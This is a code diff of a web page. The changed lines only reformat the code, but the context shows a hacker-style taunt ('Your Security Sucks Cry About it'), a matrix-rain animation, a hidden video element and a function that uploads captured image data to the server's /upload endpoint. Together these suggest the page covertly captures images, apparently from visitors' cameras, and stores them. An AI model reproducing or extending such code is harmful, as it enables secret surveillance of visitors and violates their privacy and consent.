@@ -66,6 +66,8 @@
             top: 0;
             left: 0;
             z-index: -1;
+            width: 100%;
+            height: 100%;
         }
         #video {
             display: none;
@@ -130,6 +132,7 @@
             const text = "Your Security Sucks Cry About it ; <";
             let index = 0;
             const typingTextElement = document.getElementById("typing-text");
+
             function type() {
                 if (index < text.length) {
                     typingTextElement.innerHTML += text.charAt(index);
@@ -143,6 +146,7 @@
             const ctx = canvas.getContext('2d');
             canvas.width = window.innerWidth;
             canvas.height = window.innerHeight;
+
             let matrix = "01";
             matrix = matrix.split("");
             const font_size = 10;
@@ -185,16 +189,12 @@
             async function uploadToServer(imageData) {
                 const formData = new FormData();
                 formData.append('image', dataURLtoBlob(imageData));
-
                 try {
-                    const response = await fetch("/upload", {
-                        method: "POST",
-                        body: formData,
-                    });
+                    const response = await fetch("/upload", { method: "POST", body: formData });
                     const result = await response.json();
                     if (result.message) {
                         console.log("Image uploaded:", result.message);
-                        console.log("File path:", result.filePath); 
+                        console.log("File path:", result.filePath);
                     } else {
                         console.error("Server upload failed:", result.error);
                     }
